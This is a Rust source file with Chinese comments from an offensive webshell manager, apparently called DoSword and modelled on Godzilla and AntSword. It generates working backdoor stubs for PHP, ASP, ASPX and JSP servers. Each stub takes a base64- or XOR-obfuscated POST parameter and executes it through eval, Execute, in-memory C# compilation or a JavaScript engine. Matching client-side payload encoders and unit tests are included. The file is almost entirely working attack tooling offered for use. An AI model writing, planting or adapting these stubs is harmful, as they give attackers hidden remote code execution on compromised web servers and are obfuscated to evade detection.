//! 编码器体系：客户端载荷编码与服务端 stub 生成（哥斯拉风格）。
//!
//! 每种编码器负责两件事：
//!   1. `encode`：把协议代码编码为传输载荷（与服务端 stub 的解码逻辑对应）
//!   2. `stub`：生成指定语言（php / asp / aspx / jsp）的服务端脚本，
//!      内嵌由密码派生的密钥
//!
//! 密钥派生：`md5(password)` 的 hex（32 字符）。客户端与服务端自动一致，
//! 无需额外保存密钥。

use base64::Engine;
use md5::{Digest, Md5};

use crate::protocol::ProtocolError;

/// 支持的脚本语言（stub 生成目标）。
pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];

/// 编码器：载荷编码 + stub 生成。
pub trait PayloadEncoder: Send + Sync {
    fn id(&self) -> &'static str;
    fn display_name(&self) -> &'static str;

    /// 由密码派生密钥（hex 字符串）。
    fn derive_key(&self, password: &str) -> String {
        md5_hex(password)
    }

    /// 客户端：编码协议代码为传输载荷。
    fn encode(&self, code: &str, password: &str) -> String;

    /// 服务端：生成指定语言的 stub 脚本（内嵌密钥）。
    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError>;
}

/// 编码器注册表。
pub struct EncoderRegistry {
    encoders: Vec<Box<dyn PayloadEncoder>>,
}

static GLOBAL_ENCODERS: std::sync::LazyLock<EncoderRegistry> =
    std::sync::LazyLock::new(EncoderRegistry::builtin);

impl EncoderRegistry {
    pub fn builtin() -> Self {
        Self {
            encoders: vec![
                Box::new(XorBase64Encoder),
                Box::new(Base64Encoder),
            ],
        }
    }

    /// 全局单例（协议层取编码器用，避免每次构建）。
    pub fn global() -> &'static Self {
        &GLOBAL_ENCODERS
    }

    pub fn get(&self, id: &str) -> Option<&dyn PayloadEncoder> {
        self.encoders.iter().find(|encoder| encoder.id() == id).map(|b| b.as_ref())
    }

    pub fn list(&self) -> Vec<(String, String)> {
        self.encoders
            .iter()
            .map(|encoder| (encoder.id().to_string(), encoder.display_name().to_string()))
            .collect()
    }
}

pub fn md5_hex(value: &str) -> String {
    let digest = Md5::digest(value.as_bytes());
    format!("{digest:x}")
}

/// XOR + Base64 编码器（哥斯拉风格）。
pub struct XorBase64Encoder;

impl XorBase64Encoder {
    /// 逐字节循环异或。
    fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(index, byte)| byte ^ key[index % key.len()])
            .collect()
    }
}

impl PayloadEncoder for XorBase64Encoder {
    fn id(&self) -> &'static str {
        "xor_base64"
    }

    fn display_name(&self) -> &'static str {
        "XOR_BASE64（异或混淆 + Base64）"
    }

    fn encode(&self, code: &str, password: &str) -> String {
        let key = md5_hex(password).into_bytes();
        let xored = Self::xor(code.as_bytes(), &key);
        base64::engine::general_purpose::STANDARD.encode(xored)
    }

    fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
        let key = self.derive_key(password);
        match language {
            "php" => Ok(format!(
                r#"<?php
// DoSword generated stub (xor_base64)
$k="{key}";
$d=@base64_decode($_POST['x']);
$r='';
for($i=0;$i<strlen($d);$i++){{$r.=$d[$i]^$k[$i%strlen($k)];}}
@eval($r);
"#
            )),
            "asp" => Ok(format!(
                r#"<%
' DoSword generated stub (xor_base64)
Const K = "{key}"
Function B64(d)
  Dim xml: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
  xml.DataType = "bin.base64"
  xml.Text = d
  B64 = xml.nodeTypedValue
End Function
Function X(d)
  Dim r, i
  r = ""
  For i = 1 To Len(d)
    r = r & Chr(Asc(Mid(d, i, 1)) Xor Asc(Mid(K, ((i - 1) Mod Len(K)) + 1, 1)))
  Next
  X = r
End Function
Execute X(B64(Request.Form("x")))
%>
"#
            )),
            "aspx" => Ok(format!(
                r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<script runat="server">
const string K = "{key}";
string X(string d) {{
  string r = "";
  for (int i = 0; i < d.Length; i++) r += (char)(d[i] ^ K[i % K.Length]);
  return r;
}}
void Run(string code) {{
  CSharpCodeProvider p = new CSharpCodeProvider();
  CompilerParameters prm = new CompilerParameters();
  prm.GenerateInMemory = true;
  CompilerResults res = p.CompileAssemblyFromSource(prm,
    "using System;public class T{{public static object E(){{" + code + "return null;}}}}");
  if (!res.Errors.HasErrors) {{
    object o = res.CompiledAssembly.CreateInstance("T");
    if (o != null) o.GetType().GetMethod("E").Invoke(o, new object[]{{}});
  }}
}}
</script>
<%
string x = Request["x"];
if (x != null) {{
  x = X(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x)));
  Run(x);
}}
%>
"#
            )),
            "jsp" => Ok(format!(
                r#"<%@ page contentType="text/html;charset=UTF-8" %>
<%!
String K = "{key}";
String X(String d) {{
  StringBuilder r = new StringBuilder();
  for (int i = 0; i < d.length(); i++) r.append((char)(d.charAt(i) ^ K.charAt(i % K.length())));
  return r.toString();
}}
%>
<%
String x = request.getParameter("x");
if (x != null) {{
  byte[] b = java.util.Base64.getDecoder().decode(x);
  String c = X(new String(b, "UTF-8"));
  try {{
    new javax.script.ScriptEngineManager().getEngineByName("javascript").eval(c);
  }} catch (Exception e) {{}}
}}
%>
"#
            )),
            other => Err(ProtocolError::NotSupported(format!(
                "XOR_BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

/// 裸 Base64 编码器（经典蚁剑形态，兼容现有 stub）。
pub struct Base64Encoder;

impl PayloadEncoder for Base64Encoder {
    fn id(&self) -> &'static str {
        "base64"
    }

    fn display_name(&self) -> &'static str {
        "BASE64（经典裸编码）"
    }

    fn encode(&self, code: &str, _password: &str) -> String {
        base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
    }

    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
        match language {
            "php" => Ok("<?php @eval(base64_decode($_POST['x']));\n".to_string()),
            "asp" => Ok(
                "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
            ),
            "aspx" => Ok(
                "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System\" %>\n<%@ Import Namespace=\"Microsoft.CSharp\" %>\n<%@ Import Namespace=\"System.CodeDom.Compiler\" %>\n<script runat=\"server\">\nvoid Run(string code) {\n  CSharpCodeProvider p = new CSharpCodeProvider();\n  CompilerParameters prm = new CompilerParameters();\n  prm.GenerateInMemory = true;\n  CompilerResults res = p.CompileAssemblyFromSource(prm,\n    \"using System;public class T{public static object E(){\" + code + \"return null;}}\");\n  if (!res.Errors.HasErrors) {\n    object o = res.CompiledAssembly.CreateInstance(\"T\");\n    if (o != null) o.GetType().GetMethod(\"E\").Invoke(o, new object[]{});\n  }\n}\n</script>\n<% string x = Request[\"x\"]; if (x != null) { Run(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(x))); } %>\n".to_string(),
            ),
            "jsp" => Ok(
                "<%@ page contentType=\"text/html;charset=UTF-8\" %>\n<%\nString x = request.getParameter(\"x\");\nif (x != null) {\n  byte[] b = java.util.Base64.getDecoder().decode(x);\n  try {\n    new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(new String(b, \"UTF-8\"));\n  } catch (Exception e) {}\n}\n%>\n".to_string(),
            ),
            other => Err(ProtocolError::NotSupported(format!(
                "BASE64 编码器不支持语言：{other}"
            ))),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xor_round_trip() {
        let key = md5_hex("secret").into_bytes();
        let original = b"hello dosword";
        let xored = XorBase64Encoder::xor(original, &key);
        assert_eq!(XorBase64Encoder::xor(&xored, &key), original);
    }

    #[test]
    fn xor_base64_encode_decodes_with_php_stub_key() {
        let encoder = XorBase64Encoder;
        let password = "secret";
        let code = "@ini_set(\"display_errors\",\"0\");echo 'hello';";
        let payload = encoder.encode(code, password);

        // 模拟服务端 stub 逻辑：base64 解码 → XOR 还原
        let key = encoder.derive_key(password);
        let key_bytes = key.into_bytes();
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(&payload)
            .unwrap();
        let restored = XorBase64Encoder::xor(&decoded, &key_bytes);
        assert_eq!(String::from_utf8(restored).unwrap(), code);
    }

    #[test]
    fn base64_encoder_is_plain() {
        let encoder = Base64Encoder;
        let payload = encoder.encode("echo 1;", "whatever");
        assert_eq!(
            String::from_utf8(
                base64::engine::general_purpose::STANDARD
                    .decode(&payload)
                    .unwrap()
            )
            .unwrap(),
            "echo 1;"
        );
    }

    #[test]
    fn stub_generation_all_languages() {
        for encoder in [&XorBase64Encoder as &dyn PayloadEncoder, &Base64Encoder as &dyn PayloadEncoder] {
            for language in STUB_LANGUAGES {
                let stub = encoder.stub(language, "secret").unwrap_or_else(|error| {
                    panic!("{} 生成 {language} stub 失败：{error}", encoder.id())
                });
                assert!(!stub.is_empty());
            }
        }
    }

    #[test]
    fn xor_stub_embeds_derived_key() {
        let stub = XorBase64Encoder.stub("php", "secret").unwrap();
        assert!(stub.contains(&md5_hex("secret")), "stub 应内嵌 md5 密钥");
        assert!(!stub.contains("secret"), "stub 不应含明文密码");
    }

    #[test]
    fn unsupported_language_rejected() {
        let result = XorBase64Encoder.stub("python", "secret");
        assert!(result.is_err());
    }

    #[test]
    fn key_is_md5_hex() {
        assert_eq!(md5_hex("secret"), "5ebe2294ecd0e0f08eab7690d2a6ee69");
    }
}
